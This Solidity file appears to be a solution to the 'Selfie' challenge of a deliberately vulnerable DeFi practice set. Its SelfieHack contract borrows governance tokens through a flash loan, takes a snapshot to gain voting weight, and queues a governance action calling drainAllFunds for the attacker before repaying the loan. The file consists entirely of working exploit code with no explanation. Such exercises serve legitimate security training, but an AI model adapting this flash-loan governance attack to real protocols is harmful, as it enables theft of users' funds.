// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISelfiePool {
	function flashLoan(uint256) external;
}

interface ISimpleGovernance {
	function queueAction(address, bytes calldata, uint256) external returns (uint256);

}

interface IDamnValuableTokenSnapshot {
	function transfer(address receipient, uint256 amount) external returns (bool);
	function snapshot() external returns (uint256);
}

contract SelfieHack {
	address public selfiePool;
	address public simpGov;
	address public attacker;

	constructor(address _pool, address _simpGov, address _attacker) {
		selfiePool = _pool;
		simpGov = _simpGov;
		attacker = _attacker;
	}

	function hack(uint256 amount) public {
		ISelfiePool(selfiePool).flashLoan(amount);
	}

	function receiveTokens(address token, uint256 borrowAmount) public {
		IDamnValuableTokenSnapshot(token).snapshot();

		ISimpleGovernance(simpGov).queueAction(selfiePool, abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);

		IDamnValuableTokenSnapshot(token).transfer(selfiePool, borrowAmount);
	}
}